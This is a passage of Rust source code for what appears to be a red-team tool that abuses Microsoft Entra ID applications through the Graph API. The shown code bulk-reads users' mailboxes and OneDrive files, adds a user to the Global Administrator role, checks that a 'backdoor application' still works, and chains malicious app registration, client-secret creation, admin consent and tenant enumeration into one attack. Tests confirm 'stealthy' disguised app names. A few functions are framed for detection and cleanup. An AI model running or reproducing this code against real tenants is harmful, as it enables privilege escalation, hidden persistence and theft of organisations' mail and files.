                ("$select", "id,displayName,description,mail,securityEnabled,mailEnabled"),
                ("$top", "999"),
            ])),
            self.graph_list_all::<GraphApplication>(access_token, "/v1.0/applications", Some(&[
                ("$select", "id,appId,displayName,publisherDomain,signInAudience"),
                ("$top", "999"),
            ])),
            self.graph_list_all::<GraphServicePrincipal>(access_token, "/v1.0/servicePrincipals", Some(&[
                ("$select", "id,appId,displayName,servicePrincipalType,accountEnabled"),
                ("$top", "999"),
            ])),
            self.graph_list_all::<GraphDirectoryRole>(access_token, "/v1.0/directoryRoles", Some(&[
                ("$select", "id,displayName,description,roleTemplateId"),
            ])),
            self.graph_list_all::<GraphRoleAssignment>(access_token, "/v1.0/roleManagement/directory/roleAssignments", None),
        );

        let users = users_res.context("failed to list users")?;
        let groups = groups_res.context("failed to list groups")?;
        let applications = apps_res.context("failed to list applications")?;
        let service_principals = sps_res.context("failed to list service principals")?;
        let directory_roles = roles_res.context("failed to list directory roles")?;
        let role_assignments = assignments_res.context("failed to list role assignments")?;

        Ok(TenantInfo {
            users,
            groups,
            applications,
            service_principals,
            directory_roles,
            role_assignments,
        })
    }

    /// Read all email messages from a user's mailbox.
    ///
    /// Requires: `Mail.Read` application permission.
    pub async fn read_all_mail_via_app(
        &self,
        access_token: &str,
        user_id: &str,
    ) -> Result<Vec<EmailMessage>> {
        let path = format!("/v1.0/users/{user_id}/messages");
        self.graph_list_all::<EmailMessage>(access_token, &path, Some(&[
            ("$select", "id,subject,bodyPreview,body,receivedDateTime,isRead,from"),
            ("$top", "999"),
            ("$orderby", "receivedDateTime desc"),
        ]))
        .await
        .context("failed to read user mailbox")
    }

    /// Read all files from a user's OneDrive root.
    ///
    /// Requires: `Files.Read.All` application permission.
    pub async fn read_all_files_via_app(
        &self,
        access_token: &str,
        user_id: &str,
    ) -> Result<Vec<CloudFile>> {
        let path = format!("/v1.0/users/{user_id}/drive/root/children");
        self.graph_list_all::<CloudFile>(access_token, &path, Some(&[
            ("$select", "id,name,size,lastModifiedDateTime,@microsoft.graph.downloadUrl,file"),
            ("$top", "999"),
        ]))
        .await
        .context("failed to read user OneDrive files")
    }

    /// Elevate a user to Global Administrator.
    ///
    /// Requires: `RoleManagement.ReadWrite.Directory` application permission.
    ///
    /// This adds the target user as a member of the Global Admin role.
    /// The `target_user_id` is the user's object ID (not UPN).
    pub async fn elevate_to_global_admin(
        &self,
        access_token: &str,
        target_user_id: &str,
    ) -> Result<()> {
        let graph_url = self.graph_url();

        // First, activate the Global Admin role template (idempotent).
        let activate_url = format!(
            "{graph_url}/v1.0/directoryRoles",
        );
        let activate_body = serde_json::json!({
            "roleTemplateId": role_templates::GLOBAL_ADMIN
        });

        let resp = self
            .http_client
            .post(&activate_url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&activate_body)
            .send()
            .await
            .context("directory role activation HTTP error")?;

        if !resp.status().is_success() {
            // Role may already be activated — try to find it.
            log::debug!("directory role activation returned: {}", resp.status());
        }

        // Find the Global Admin role ID.
        let roles = self
            .graph_list_all::<GraphDirectoryRole>(
                access_token,
                "/v1.0/directoryRoles",
                Some(&[
                    ("$filter", format!("roleTemplateId eq '{}'", role_templates::GLOBAL_ADMIN).as_str()),
                ]),
            )
            .await
            .context("failed to find Global Admin role")?;

        let global_admin_role = roles
            .into_iter()
            .next()
            .ok_or_else(|| anyhow!("Global Admin directory role not found"))?;

        let role_id = global_admin_role
            .id
            .ok_or_else(|| anyhow!("Global Admin role missing id"))?;

        // Add the target user as a member.
        let ref_body = DirectoryObjectRef {
            odata_id: format!(
                "{graph_url}/v1.0/directoryObjects/{target_user_id}"
            ),
        };

        let url = format!("{graph_url}/v1.0/directoryRoles/{role_id}/members/$ref");
        let resp = self
            .http_client
            .post(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&ref_body)
            .send()
            .await
            .context("Global Admin member add HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            if body.contains("AlreadyExists") {
                log::info!(
                    "user {} is already a Global Admin",
                    target_user_id
                );
                return Ok(());
            }
            bail!(
                "failed to add user to Global Admin role: HTTP {} — {}",
                status,
                body
            );
        }

        log::warn!(
            "elevated user {} to Global Administrator",
            target_user_id
        );

        Ok(())
    }

    // -------------------------------------------------------------------
    // Step 6: Stealth Persistence
    // -------------------------------------------------------------------

    /// Verify the backdoor application's persistence.
    ///
    /// Attempts to authenticate with the stored application credentials.
    /// Returns `true` if the application still exists and the secret is valid.
    pub async fn verify_app_persistence(
        &self,
        tenant_id: &str,
        credential: &AppCredential,
    ) -> Result<bool> {
        let secret = match credential.decrypt_secret(&self.session_key) {
            Ok(s) => s,
            Err(e) => {
                log::error!("failed to decrypt stored secret: {e}");
                return Ok(false);
            }
        };

        match self
            .authenticate_as_app(
                tenant_id,
                &credential.client_id,
                &secret,
                "https://graph.microsoft.com/.default",
            )
            .await
        {
            Ok(_) => {
                log::info!(
                    "persistence verified: app client_id={} still active",
                    credential.client_id
                );
                Ok(true)
            }
            Err(e) => {
                log::warn!("persistence check failed: {e}");
                Ok(false)
            }
        }
    }

    /// List all applications in the tenant.
    ///
    /// Useful for blue-team detection documentation — identifies indicators
    /// that would reveal the malicious app:
    /// - Recently created (createdDateTime)
    /// - Unusual `signInAudience` (e.g. `AzureADandPersonalMicrosoftAccount`)
    /// - High-privilege `requiredResourceAccess`
    /// - Client secrets with long expiry
    /// - No publisher domain or unusual domain
    pub async fn list_suspicious_apps(
        &self,
        access_token: &str,
    ) -> Result<Vec<GraphApplication>> {
        self.graph_list_all::<GraphApplication>(
            access_token,
            "/v1.0/applications",
            Some(&[
                ("$select", "id,appId,displayName,publisherDomain,signInAudience,createdDateTime"),
                ("$top", "999"),
            ]),
        )
        .await
        .context("failed to list applications")
    }

    /// Remove (delete) a malicious application registration.
    ///
    /// Use for cleanup after an engagement.
    pub async fn remove_malicious_app(
        &self,
        access_token: &str,
        app_object_id: &str,
    ) -> Result<()> {
        let graph_url = self.graph_url();
        let url = format!("{graph_url}/v1.0/applications/{app_object_id}");

        let resp = self
            .http_client
            .delete(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .send()
            .await
            .context("application deletion HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("application deletion failed: HTTP {} — {}", status, body);
        }

        log::info!("deleted malicious app object_id={}", app_object_id);
        Ok(())
    }

    // -------------------------------------------------------------------
    // Convenience: Full Attack Chain
    // -------------------------------------------------------------------

    /// Execute the complete application abuse attack chain.
    ///
    /// 1. Register a malicious application with high-value permissions.
    /// 2. Add a client secret (encrypted via HKDF).
    /// 3. Grant admin consent (requires Global Admin token).
    /// 4. Authenticate using the application credential.
    /// 5. Enumerate the tenant.
    ///
    /// Returns the `(AppCredential, TenantInfo)` on success.
    pub async fn execute_full_chain(
        &self,
        admin_token: &str,
        tenant_id: &str,
    ) -> Result<(AppCredential, TenantInfo)> {
        // Step 1: Register.
        let perms = high_value_permissions();
        let app = self
            .register_malicious_app(admin_token, None, &[], &perms)
            .await
            .context("step 1: application registration failed")?;

        // Step 2: Add secret.
        let mut credential = self
            .add_app_secret(admin_token, &app.object_id)
            .await
            .context("step 2: client secret addition failed")?;
        credential.client_id = app.client_id.clone();

        // Step 3: Grant admin consent.
        self.grant_admin_consent(admin_token, &app.client_id, &perms)
            .await
            .context("step 3: admin consent grant failed")?;

        // Step 4: Authenticate as the application.
        let secret = credential
            .decrypt_secret(&self.session_key)
            .context("step 4: secret decryption failed")?;
        let token = self
            .authenticate_as_app(
                tenant_id,
                &app.client_id,
                &secret,
                "https://graph.microsoft.com/.default",
            )
            .await
            .context("step 4: client credentials auth failed")?;

        // Step 5: Enumerate tenant.
        let tenant_info = self
            .enumerate_tenant_via_app(&token.access_token)
            .await
            .context("step 5: tenant enumeration failed")?;

        log::info!(
            "full attack chain complete: registered '{}', enumerated {} users, {} groups",
            app.display_name,
            tenant_info.users.len(),
            tenant_info.groups.len()
        );

        Ok((credential, tenant_info))
    }

    // -------------------------------------------------------------------
    // Internal helpers
    // -------------------------------------------------------------------

    /// Execute a Graph API GET request and collect ALL pages.
    ///
    /// Handles OData `@odata.nextLink` pagination automatically.
    async fn graph_list_all<T: serde::de::DeserializeOwned + fmt::Debug>(
        &self,
        access_token: &str,
        path: &str,
        query: Option<&[(&str, &str)]>,
    ) -> Result<Vec<T>> {
        let graph_url = self.graph_url();
        let url = format!("{graph_url}{path}");

        let mut req = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"));

        if let Some(params) = query {
            req = req.query(params);
        }

        let resp = req
            .send()
            .await
            .context("Graph API list request HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph API list request failed: HTTP {} — {}", status, body);
        }

        let first_page: GraphListResponse<T> = resp
            .json()
            .await
            .context("failed to parse Graph API list response")?;

        let mut all_items = first_page.value;
        let mut next_link = first_page.odata_next_link;

        // Follow pagination links.
        while let Some(link) = next_link.take() {
            let resp = self
                .http_client
                .get(&link)
                .header("Authorization", format!("Bearer {access_token}"))
                .send()
                .await
                .context("Graph API next-link HTTP error")?;

            if !resp.status().is_success() {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                log::warn!("Graph API pagination failed: HTTP {} — {}", status, body);
                break;
            }

            let page: GraphListResponse<T> = resp.json().await.unwrap_or_else(|_| {
                GraphListResponse {
                    odata_context: None,
                    odata_next_link: None,
                    value: vec![],
                }
            });

            next_link = page.odata_next_link;
            all_items.extend(page.value);
        }

        Ok(all_items)
    }
}

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------

/// Compute an ISO 8601 datetime string for `days` days from now.
fn chrono_now_plus_days(days: u64) -> Option<String> {
    let now = SystemTime::now();
    let future = now.checked_add(Duration::from_secs(days * 86400))?;
    let secs = future.duration_since(UNIX_EPOCH).ok()?.as_secs();
    // Simple ISO 8601 formatting without chrono dependency.
    let days_since_epoch = secs / 86400;
    let (year, month, day) = days_to_ymd(days_since_epoch);
    let hour = (secs % 86400) / 3600;
    let minute = (secs % 3600) / 60;
    let second = secs % 60;
    Some(format!(
        "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
        year, month, day, hour, minute, second
    ))
}

/// Convert days since the Unix epoch to (year, month, day).
fn days_to_ymd(days: u64) -> (u32, u32, u32) {
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m as u32, d as u32)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify HKDF encrypt/decrypt roundtrip for client secrets.
    #[test]
    fn test_secret_encrypt_decrypt_roundtrip() {
        let session_key = b"test-session-key-32-bytes-aaaaaaaa";
        let raw_secret = "abc123~!@#$%^&*()_+-={}[]|:;<>?,./";

        let cred = AppCredential::encrypt_secret(raw_secret, session_key).unwrap();

        // Encrypted must differ from plaintext.
        assert_ne!(
            cred.encrypted_secret,
            raw_secret.as_bytes().to_vec(),
            "encrypted secret must differ from plaintext"
        );

        // Decrypt must recover the original.
        let decrypted = cred.decrypt_secret(session_key).unwrap();
        assert_eq!(decrypted, raw_secret);
    }

    /// Verify that a wrong session key produces garbage.
    #[test]
    fn test_secret_decrypt_wrong_key_fails() {
        let session_key = b"test-session-key-32-bytes-aaaaaaaa";
        let wrong_key = b"wrong-session-key-32-bytes-bbbbbbb";
        let raw_secret = "super-secret-value";

        let cred = AppCredential::encrypt_secret(raw_secret, session_key).unwrap();
        let result = cred.decrypt_secret(wrong_key);

        // Should either fail or produce wrong output.
        match result {
            Ok(decrypted) => assert_ne!(decrypted, raw_secret),
            Err(_) => {} // Acceptable — XOR may produce invalid UTF-8
        }
    }

    /// Verify the with_ids builder.
    #[test]
    fn test_app_credential_with_ids() {
        let session_key = b"test-key-32-bytes-long-aaaaaaaaaa";
        let cred = AppCredential::encrypt_secret("secret", session_key)
            .unwrap()
            .with_ids("client-123", "object-456", "secret-789");

        assert_eq!(cred.client_id, "client-123");
        assert_eq!(cred.object_id, "object-456");
        assert_eq!(cred.secret_id, "secret-789");
    }

    /// Verify GraphPermission construction.
    #[test]
    fn test_graph_permission_new() {
        let perm = GraphPermission::new("some-id", "Some.Permission");
        assert_eq!(perm.id, "some-id");
        assert_eq!(perm.name, "Some.Permission");
    }

    /// Verify high_value_permissions returns expected set.
    #[test]
    fn test_high_value_permissions_not_empty() {
        let perms = high_value_permissions();
        assert!(!perms.is_empty(), "high-value permissions must not be empty");
        assert!(perms.len() >= 5, "should have at least 5 permissions");

        // All must have non-empty IDs and names.
        for p in &perms {
            assert!(!p.id.is_empty());
            assert!(!p.name.is_empty());
        }
    }

    /// Verify HKDF info constant is properly defined.
    #[test]
    fn test_hkdf_info_constant_exists() {
        assert_eq!(HKDF_INFO_ENTRA_SECRET.len(), 16);
    }

    /// Verify stealthy display name selection.
    #[test]
    fn test_random_stealthy_name() {
        let name = random_stealthy_name();
        assert!(!name.is_empty());
        assert!(
            STEALTHY_DISPLAY_NAMES.contains(&name),
            "name must be from the pre-defined list"
        );
    }

    /// Verify days_to_ymd conversion for known date (2024-01-01 = 19723 days since epoch).
    #[test]
    fn test_days_to_ymd_known_date() {
        // 2024-01-01 = 19723 days since Unix epoch
        let (y, m, d) = days_to_ymd(19723);
        assert_eq!(y, 2024);
        assert_eq!(m, 1);
        assert_eq!(d, 1);
    }

    /// Verify days_to_ymd conversion for epoch (1970-01-01 = 0 days).
    #[test]
    fn test_days_to_ymd_epoch() {
        let (y, m, d) = days_to_ymd(0);
        assert_eq!(y, 1970);
        assert_eq!(m, 1);
        assert_eq!(d, 1);
    }

    /// Verify chrono_now_plus_days produces a valid ISO 8601 string.
    #[test]
    fn test_chrono_now_plus_days_format() {
        let result = chrono_now_plus_days(365);
        assert!(result.is_some());
        let s = result.unwrap();
        // Must end with Z
        assert!(s.ends_with('Z'));
        // Must parse as a reasonable date
        assert!(s.starts_with('2')); // 2xxx year
        assert!(s.contains('T')); // Has time separator
    }

    /// Verify TenantInfo display formatting.
    #[test]
    fn test_tenant_info_display() {
        let info = TenantInfo {
            users: vec![GraphUser {
                id: Some("user-1".to_string()),
                user_principal_name: Some("admin@contoso.com".to_string()),
                display_name: Some("Admin User".to_string()),
                mail: None,
                job_title: None,
                department: None,
                account_enabled: Some(true),
            }],
            groups: vec![],
            applications: vec![],
            service_principals: vec![],
            directory_roles: vec![],
            role_assignments: vec![GraphRoleAssignment {
                id: Some("ra-1".to_string()),
                principal_id: Some("user-1".to_string()),
                role_definition_id: Some("role-def-1".to_string()),
                directory_scope_id: None,
                principal_id_name: None,
            }],
        };

        let display = format!("{info}");
        assert!(display.contains("Users:               1"));
        assert!(display.contains("Groups:              0"));
        assert!(display.contains("Privileged Users"));
        assert!(display.contains("admin@contoso.com"));
    }

    /// Verify CloudEnvironment endpoint URLs for both clouds.
    #[test]
    fn test_cloud_endpoints() {
        let client = EntraAppAbuse::new(
            CloudEnvironment::Commercial,
            b"test-session-key-for-unit-test!!",
        )
        .unwrap();
        assert_eq!(client.graph_url(), "https://graph.microsoft.com");

        let client = EntraAppAbuse::new(
            CloudEnvironment::Government,
            b"test-session-key-for-unit-test!!",
        )
        .unwrap();
        assert_eq!(client.graph_url(), "https://graph.microsoft.us");
    }

    /// Verify the client struct can be constructed.
    #[test]
    fn test_client_construction() {
        let client = EntraAppAbuse::new(
            CloudEnvironment::Commercial,
            b"test-session-key-for-unit-test!!",
        );
        assert!(client.is_ok());
    }

    /// Verify encrypted secret length matches raw secret length (XOR property).
    #[test]
    fn test_encrypted_secret_length_matches() {
        let key = b"test-key-32-bytes-long-enough!!!!!";
        let secret = "exactly-17-chars";
        let cred = AppCredential::encrypt_secret(secret, key).unwrap();
        assert_eq!(cred.encrypted_secret.len(), secret.len());
    }

    /// Verify empty secret handling.
    #[test]
    fn test_empty_secret() {
        let key = b"test-key-32-bytes-long-enough!!!!!";
        let secret = "";
        let cred = AppCredential::encrypt_secret(secret, key).unwrap();
        assert!(cred.encrypted_secret.is_empty());
        let decrypted = cred.decrypt_secret(key).unwrap();
        assert_eq!(decrypted, "");
    }

    /// Verify long secret handling (512 bytes).
    #[test]
    fn test_long_secret() {
        let key = b"test-key-32-bytes-long-enough!!!!!";
        let secret = "x".repeat(512);
        let cred = AppCredential::encrypt_secret(&secret, key).unwrap();
        assert_eq!(cred.encrypted_secret.len(), 512);
        let decrypted = cred.decrypt_secret(key).unwrap();
        assert_eq!(decrypted, secret);
    }
}
